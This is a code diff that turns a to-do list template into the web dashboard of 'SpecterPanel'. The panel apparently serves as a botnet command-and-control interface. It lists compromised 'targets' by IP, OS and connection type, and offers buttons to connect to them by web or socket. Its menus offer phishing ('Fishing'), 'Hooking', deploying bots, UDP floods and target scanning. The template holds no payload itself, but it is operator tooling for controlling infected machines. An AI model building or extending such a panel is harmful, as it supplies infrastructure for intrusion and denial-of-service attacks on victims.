@@ -1,56 +1,185 @@
 {% extends 'view.html' %}
+
 {% block title %}
 	profile
 {% endblock %}
 
-{% block body %}
-	<h5>Hello, World</h5>
-	<div class="card">
-		<div class="card-body">
-		  <h4 class="card-title">To do list</h4>
-		  <div class="add-items d-flex">
-			<input type="text" class="form-control todo-list-input" placeholder="enter task..">
-			<button class="add btn btn-primary todo-list-add-btn">Add</button>
-		  </div>
-		  <div class="list-wrapper">
-			<ul class="d-flex flex-column-reverse text-white todo-list todo-list-custom">
-			  <li>
-				<div class="form-check form-check-primary">
-				  <label class="form-check-label">
-					<input class="checkbox" type="checkbox"> Create invoice </label>
-				</div>
-				<i class="remove mdi mdi-close-box"></i>
-			  </li>
-			  <li>
-				<div class="form-check form-check-primary">
-				  <label class="form-check-label">
-					<input class="checkbox" type="checkbox"> Meeting with Alita </label>
-				</div>
-				<i class="remove mdi mdi-close-box"></i>
-			  </li>
-			  <li>
-				<div class="form-check form-check-primary">
-				  <label class="form-check-label">
-					<input class="checkbox" type="checkbox"> Prepare for presentation </label>
-				</div>
-				<i class="remove mdi mdi-close-box"></i>
-			  </li>
-			  <li>
-				<div class="form-check form-check-primary">
-				  <label class="form-check-label">
-					<input class="checkbox" type="checkbox"> Plan weekend outing </label>
-				</div>
-				<i class="remove mdi mdi-close-box"></i>
-			  </li>
-			  <li>
-				<div class="form-check form-check-primary">
-				  <label class="form-check-label">
-					<input class="checkbox" type="checkbox"> Pick up kids from school </label>
-				</div>
-				<i class="remove mdi mdi-close-box"></i>
-			  </li>
-			</ul>
-		  </div>
+{% block style %}
+	<style>
+		.card-custom {
+			background: #161b22;
+			color: #f0f6fc;
+			border-radius: 12px;
+			padding: 1.5rem;
+			margin-bottom: 1.5rem;
+			box-shadow: 0 0 10px rgba(0, 255, 255, 0.08);
+		}
+		.btn i { font-size: 1rem; }
+		.tooltip-inner { background-color: #444; color: #fff; }
+	</style>
+{% endblock %}
+
+{% block menus %}
+<nav class="sidebar sidebar-offcanvas" id="sidebar">
+	<div class="profile-desc">
+		<div class="profile-pic">
+			<div class="count-indicator">
+				<img class="img-xs rounded-circle" src="{{ url_for('static', filename='assets/images/faces/3.jpg') }}" alt="">
+				<span class="count bg-success"></span>
+			</div>
+			<div class="profile-name">
+				<h5 class="mb-0 font-weight-normal">{{ email }}</h5>
+			</div>
 		</div>
-	  </div>
+	</div>
+
+	<div class="sidebar-brand-wrapper d-none d-lg-flex align-items-center justify-content-center fixed-top">
+		<a class="sidebar-brand brand-logo" href="/dashboard">SpecterPanel</a>
+		<a class="sidebar-brand brand-logo-mini" href="/dashboard">SP</a>
+	</div>
+
+	<ul class="nav">
+		<li class="nav-item nav-category">
+			<span class="nav-link">Menu Options</span>
+		</li>
+		<li class="nav-item menu-items"><a class="nav-link" href="/dashboard"><span class="menu-icon"><i class="mdi mdi-view-dashboard"></i></span><span class="menu-title">Dashboard</span></a></li>
+		<li class="nav-item menu-items"><a class="nav-link" href="/api_link"><span class="menu-icon"><i class="mdi mdi-webhook"></i></span><span class="menu-title">Api Link</span></a></li>
+		<li class="nav-item menu-items"><a class="nav-link" href="/fishing"><span class="menu-icon"><i class="mdi mdi-fish"></i></span><span class="menu-title">Fishing</span></a></li>
+		<li class="nav-item menu-items"><a class="nav-link" href="/hooking"><span class="menu-icon"><i class="mdi mdi-hook"></i></span><span class="menu-title">Hooking</span></a></li>
+		<li class="nav-item menu-items"><a class="nav-link" href="/code"><span class="menu-icon"><i class="mdi mdi-code-braces"></i></span><span class="menu-title">Code ground</span></a></li>
+	</ul>
+</nav>
+{% endblock %}
+
+{% block body %}
+<div class="container mt-4">
+	<div class="row">
+		<!-- Target Table -->
+		<div class="col-md-12">
+			<div class="card-custom">
+				<h4>Targets Available</h4>
+				<div class="table-responsive">
+					<table class="table table-dark table-hover">
+						<thead>
+							<tr>
+								<th>IP</th>
+								<th>Operating System</th>
+								<th>Connection Type</th>
+								<th>Actions</th>
+							</tr>
+						</thead>
+						<tbody>
+							{% if targets %}
+								{% for target, conn, target_name in targets %}
+								<tr>
+									<td>{{ target.ip | e }}</td>
+									<td>
+										<label class="badge badge-{{ 'success' if target.os == 'Windows' else 'warning' }}">{{ target.os }}</label>
+									</td>
+									<td>
+										{% if conn == 'wifi' %}
+											<i class="mdi mdi-wifi"></i> {{ conn }}
+										{% elif conn == 'local' or conn == 'ethernet' %}
+											<i class="mdi mdi-access-point-network"></i> {{ conn }}
+										{% else %}
+											{{ conn }}
+										{% endif %}
+									</td>
+									<td>
+										<button class="btn btn-sm btn-outline-primary" title="Connect Web" data-toggle="tooltip" onclick="openModal('web', '{{ target_name }}', '{{ target.ip | e }}')">
+											<i class="mdi mdi-web"></i>
+										</button>
+										<button class="btn btn-sm btn-outline-info" title="Connect Socket" data-toggle="tooltip" onclick="openModal('socket', '{{ target_name }}', '{{ target.ip | e }}')">
+											<i class="mdi mdi-lan-connect"></i>
+										</button>
+										<button class="btn btn-sm btn-outline-danger" title="Delete" data-toggle="tooltip" onclick="openModal('delete', '{{ target_name }}', '{{ target.ip | e }}')">
+											<i class="mdi mdi-delete"></i>
+										</button>
+									</td>
+								</tr>
+								{% endfor %}
+							{% else %}
+								<tr>
+									<td colspan="4" class="text-center text-muted">No targets found. Please add or wait for a connection.</td>
+								</tr>
+							{% endif %}
+						</tbody>
+					</table>
+				</div>
+			</div>
+		</div>
+
+		<!-- Quick Start -->
+		<div class="col-md-6">
+			<div class="card-custom">
+				<h4>Quick Start</h4>
+				<ul>
+					<li><a href="#">Deploy New Bot</a></li>
+					<li><a href="#">Start UDP Flood</a></li>
+					<li><a href="#">Scan Open Targets</a></li>
+				</ul>
+			</div>
+		</div>
+
+		<!-- Other Options -->
+		<div class="col-md-6">
+			<div class="card-custom">
+				<h4>Other Options</h4>
+				<ul>
+					<li><a href="#">Manage Custom Bots</a></li>
+					<li><a href="#">Import / Export Targets</a></li>
+					<li><a href="#">System Settings</a></li>
+				</ul>
+			</div>
+		</div>
+	</div>
+</div>
+
+<!-- Action Modal -->
+<div class="modal fade" id="actionModal" tabindex="-1" role="dialog" aria-labelledby="modalTitle" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered" role="document">
+		<div class="modal-content text-dark">
+			<div class="modal-header">
+				<h5 class="modal-title" id="modalTitle">Confirm Action</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span>&times;</span></button>
+			</div>
+			<div class="modal-body" id="modalBodyText"></div>
+			<div class="modal-footer">
+				<button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
+				<a id="confirmBtn" href="#" class="btn btn-primary">Proceed</a>
+			</div>
+		</div>
+	</div>
+</div>
+{% endblock %}
+
+{% block script %}
+<script>
+	$(function () {
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+
+	function openModal(action, target_name, ip) {
+		const actionText = {
+			web: 'Connect via Web',
+			socket: 'Connect via Socket',
+			delete: 'Delete Target'
+		};
+		const modalText = {
+			web: `Are you sure you want to connect to ${ip} via Web?`,
+			socket: `Are you sure you want to connect to ${ip} via Socket?`,
+			delete: `Are you sure you want to delete target ${ip}?`
+		};
+		const actionLinkMap = {
+			web: `/api_command/${target_name}`,
+			socket: `/socket/${target_name}`,
+			delete: `/delete/${target_name}`
+		};
+
+		$('#modalTitle').text(actionText[action]);
+		$('#modalBodyText').text(modalText[action]);
+		$('#confirmBtn').attr('href', actionLinkMap[action]);
+		$('#actionModal').modal('show');
+	}
+</script>
 {% endblock %}
